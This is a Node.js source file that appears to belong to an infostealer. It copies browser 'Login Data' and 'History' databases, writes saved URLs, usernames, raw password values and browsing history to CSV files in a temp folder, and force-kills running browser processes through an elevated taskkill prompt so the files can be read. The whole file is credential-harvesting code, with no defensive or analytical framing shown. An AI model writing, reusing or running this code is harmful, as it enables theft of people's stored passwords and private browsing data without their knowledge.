const { existsSync, copyFileSync, mkdirSync, writeFileSync } = require('fs');
const { join, sep } = require('path');
const { randomFileCreator } = require('../dir');
const psList = () => import('ps-list').then(({ default: psList }) => psList());
const sudo = require('sudo-prompt');
const { tempFolder } = require('../../index');
const moment = require('moment');
const { addDoubleQuotes } = require('../string');
const sqlite3 = require('sqlite3').verbose();

const _ = (name, path, use, database, rows, dbData) => {
  path += join(sep, 'Default', use);
  if (!existsSync(path)) return;

  if (!existsSync(join(tempFolder, 'Browsers', name))) mkdirSync(join(tempFolder, 'Browsers', name));
  const file = join(tempFolder, 'Browsers', name, `${use}.csv`);
  const data = [];
  const dbFile = randomFileCreator();
  copyFileSync(path, dbFile);

  const db = new sqlite3.Database(dbFile);
  data.push(rows);
  db.serialize(() => {
    db.each(`SELECT * from ${database}`, (err, row) => {
      if (err) return;
      console.log(row);
      data.push(dbData(row));

      writeFileSync(file, data.join('\n'));
    });
  });

  db.close();
};

module.exports.passwords = (name, path) => {
  return _(name, path, 'Login Data', 'logins', [
    'origin url', 'username', 'password', 'date created', 'date last used', 'date password modified',
  ], (row) => ([
    addDoubleQuotes(row.origin_url),
    addDoubleQuotes(row.username_value),
    row.password_value.toString(), // Buffer
    /*moment(*/row.date_created/*).toISOString()*/,
    /*moment(*/row.date_last_used/*).toISOString()*/,
    /*moment(*/row.date_password_modified/*).toISOString()*/,
  ]));
};

module.exports.history = (name, path) => {
  return _(name, path, 'History', 'urls', [
    'url', 'title', 'visit count', 'typed count', 'last visit time',
  ], (row) => ([
    addDoubleQuotes(row.url),
    addDoubleQuotes(row.title),
    row.visit_count,
    row.typed_count,
    /*moment(*/row.last_visit_time/*).toISOString()*/,
  ]));
};

module.exports.kill = (browser, onKilled) => {
  return psList().then(data => {
    const browserProcess = data.find(p => p.name === `${browser}.exe`);
    if (typeof browserProcess !== 'undefined' && 'name' in browserProcess) {
      sudo.exec(`taskkill /f /im ${browserProcess?.name}`, {
        name: require('../../config').name
      }, (err) => {
        if (err) return;
        onKilled();
      });
    } else { // Process does not exist, we don't need to kill it (as it doesn't exist)
      onKilled();
    }
  });
};
